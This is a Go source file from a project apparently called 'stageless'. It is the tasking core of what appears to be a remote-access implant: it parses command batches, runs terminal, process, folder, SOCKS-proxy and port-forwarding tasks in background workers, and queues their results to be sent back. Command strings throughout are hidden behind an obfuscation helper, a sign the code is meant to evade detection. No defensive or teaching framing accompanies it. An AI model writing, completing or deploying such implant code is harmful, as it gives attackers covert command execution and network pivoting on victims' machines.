package tasks

import (
	"encoding/json"
	"strconv"
	"strings"
	"unicode/utf8"
	"sync/atomic"

	global "stageless/utils"
	"stageless/utils/obf"
)

const ThreadBufferContent = 32 * 1024 * 1024

var OutSnap []uint32

var runDispatch func(cmdType, mode, raw, args, input, params, host, taskTag string) []byte

func SetRunDispatch(fn func(cmdType, mode, raw, args, input, params, host, taskTag string) []byte) {
	// Stores the function that runs each command
	runDispatch = fn
}

func functionOfWorker(wid uint32) {
	// Here is where one task is run and its result is stored
	defer atomic.AddInt32(&global.BgWorkers, -1)
	defer deleteThread(wid)

	ok, tr := readThread(wid, "")
	if !ok {
		return
	}
	live := tr
	live.Alive = true
	updateThread(wid, live)

	ok, work := readTaskTakeInput(tr.TaskID)
	if !ok || !work.Running {
		return
	}

	failed := true
	raw := ""
	if runDispatch != nil {
		out := runDispatch(
			work.CmdType, work.Mode, work.Raw, work.Args,
			work.Input, work.Params, work.Host, work.Tag,
		)
		switch {
		case out == nil && (work.Mode == obf.S("download") || work.CmdType == obf.S("files")):
			failed = false
			raw = ""
		case out == nil:
			failed = true
		case len(out) > ThreadBufferContent:
			failed = true
		default:
			failed = false
			raw = string(out)
		}
	}

	work.Input = ""
	done := work
	done.Running = false
	done.Done = true
	if work.Mode == obf.S("download") && !failed && len(raw) == 0 {
		done.Result = ""
		done.PendingOut = false
	} else {
		done.Result = createJSON(work, raw, failed)
		done.PendingOut = done.Result != ""
	}
	updateTask(tr.TaskID, done)
}

func liftInputString(body *string) string {
	// Reads a large input string out of the JSON body
	const minLift = 1024 * 1024
	key := `"` + obf.S("input") + `"`
	raw := *body
	search := 0
	bestOpen, bestClose, bestSpan := -1, -1, 0
	for search < len(raw) {
		k := strings.Index(raw[search:], key)
		if k < 0 {
			break
		}
		k += search
		i := k + len(key)
		for i < len(raw) && (raw[i] == ' ' || raw[i] == '\t' || raw[i] == '\n' || raw[i] == '\r') {
			i++
		}
		if i >= len(raw) || raw[i] != ':' {
			search = k + 1
			continue
		}
		i++
		for i < len(raw) && (raw[i] == ' ' || raw[i] == '\t' || raw[i] == '\n' || raw[i] == '\r') {
			i++
		}
		if i >= len(raw) || raw[i] != '"' {
			search = k + 1
			continue
		}
		openQ := i
		j := i + 1
		for j < len(raw) {
			if raw[j] == '\\' {
				if j+1 >= len(raw) {
					break
				}
				if raw[j+1] == 'u' {
					j += 6
				} else {
					j += 2
				}
			} else if raw[j] == '"' {
				break
			} else {
				j++
			}
		}
		if j >= len(raw) || raw[j] != '"' {
			search = k + 1
			continue
		}
		span := j - (openQ + 1)
		if span > bestSpan {
			bestSpan = span
			bestOpen = openQ
			bestClose = j
		}
		search = j + 1
	}
	if bestOpen < 0 || bestSpan < minLift {
		return ""
	}
	out := make([]byte, 0, bestSpan)
	for j := bestOpen + 1; j < bestClose; {
		if raw[j] == '\\' && j+1 < bestClose {
			n := raw[j+1]
			switch n {
			case '"', '\\', '/', '\'':
				out = append(out, n)
			case 'b':
				out = append(out, '\b')
			case 'f':
				out = append(out, '\f')
			case 'n':
				out = append(out, '\n')
			case 'r':
				out = append(out, '\r')
			case 't':
				out = append(out, '\t')
			case 'u':
				if j+6 <= bestClose {
					if v, err := strconv.ParseUint(raw[j+2:j+6], 16, 32); err == nil {
						out = utf8.AppendRune(out, rune(v))
					}
					j += 6
					continue
				}
			default:
				out = append(out, n)
			}
			j += 2
			continue
		}
		out = append(out, raw[j])
		j++
	}
	*body = raw[:bestOpen] + `""` + raw[bestClose+1:]
	return string(out)
}

func RunCommand(body string) {
	// Receives the command body and starts one worker per command
	if body == "" {
		return
	}
	if uint64(len(body)) > TasksBufferMax {
		return
	}
	lifted := ""
	if len(body) >= 1024*1024 {
		lifted = liftInputString(&body)
	}
	var data map[string]any
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return
	}
	cmds, ok := data[obf.S("commands")].([]any)
	if !ok {
		return
	}
	allowed := map[string]bool{
		obf.S("terminal"):        true,
		obf.S("folders"):         true,
		obf.S("process"):         true,
		obf.S("socks"):           true,
		obf.S("port_forwarding"): true,
	}
	for _, item := range cmds {
		cmd, ok := item.(map[string]any)
		if !ok {
			continue
		}
		cmdType, _ := cmd[obf.S("type")].(string)
		if !allowed[cmdType] {
			continue
		}
		tag, _ := cmd[obf.S("task_tag")].(string)
		if tag == "" {
			continue
		}
		host := global.HostTag
		if v, ok := cmd[obf.S("host")].(string); ok && v != "" {
			host = v
		}
		params := obf.S("{}")
		if raw, ok := cmd[obf.S("parameters")].(map[string]any); ok {
			b, _ := json.Marshal(raw)
			params = string(b)
		}
		input := ""
		jsonInput, _ := cmd[obf.S("input")].(string)
		if lifted != "" && jsonInput == "" {
			input = lifted
			lifted = ""
		} else if jsonInput != "" {
			input = jsonInput
		}
		if uint64(len(input)) > TasksBufferMax {
			continue
		}

		rec := TaskRecord{
			Tag:     tag,
			CmdType: cmdType,
			Host:    host,
			Input:   input,
			Params:  params,
			Name:    cmdType,
		}
		if cmdType == obf.S("terminal") {
			rec.Name = obf.S("terminal")
			var p map[string]any
			if err := json.Unmarshal([]byte(params), &p); err == nil {
				if v, ok := p[obf.S("mode")].(string); ok {
					rec.Mode = v
					rec.Name = v
					rec.Raw = v
				}
				if v, ok := p[obf.S("args")].(string); ok {
					rec.Args = v
				}
				if v, ok := p[obf.S("raw")].(string); ok {
					rec.Raw = v
				}
			}
		} else if (cmdType == obf.S("socks") || cmdType == obf.S("port_forwarding")) && input != "" {
			rec.Name = input
		}

		rec.Running = true
		threadName := rec.Name
		mode := rec.Mode
		id := createTask(rec)
		wid := createThread(ThreadRecord{TaskID: id, Name: threadName, Alive: true})
		if mode == obf.S("download") {
			dlTag := ParamValue(params, obf.S("download_id"), []string{obf.S("--download-id")})
			if dlTag != "" {
				ok, trRec := readThread(wid, "")
				if ok {
					trRec.Tag = dlTag
					updateThread(wid, trRec)
				}
			}
		}
		atomic.AddInt32(&global.BgWorkers, 1)
		go functionOfWorker(wid)
	}
}

func CheckOutput() bool {
	// Checks that any task still has pending output
	taskMu.Lock()
	order := append([]uint32{}, taskOrder...)
	taskMu.Unlock()
	for _, id := range order {
		ok, t := readTask(id, "")
		if ok && t.PendingOut {
			return true
		}
	}
	return false
}

func GetOutput() string {
	// Builds the JSON list of pending task outputs
	var parts []string
	OutSnap = nil
	taskMu.Lock()
	order := append([]uint32{}, taskOrder...)
	taskMu.Unlock()
	for _, id := range order {
		ok, t := readTask(id, "")
		if ok && t.PendingOut && t.Result != "" {
			parts = append(parts, t.Result)
			OutSnap = append(OutSnap, id)
		}
	}
	if len(parts) == 0 {
		return obf.S("[]")
	}
	return obf.S("[") + strings.Join(parts, obf.S(",")) + obf.S("]")
}

func ClearTasks(sentOk bool, sentBody string) {
	// Deletes tasks whose output was already sent
	if !sentOk {
		return
	}
	for _, id := range OutSnap {
		DeleteTask(id)
	}
	OutSnap = nil
}
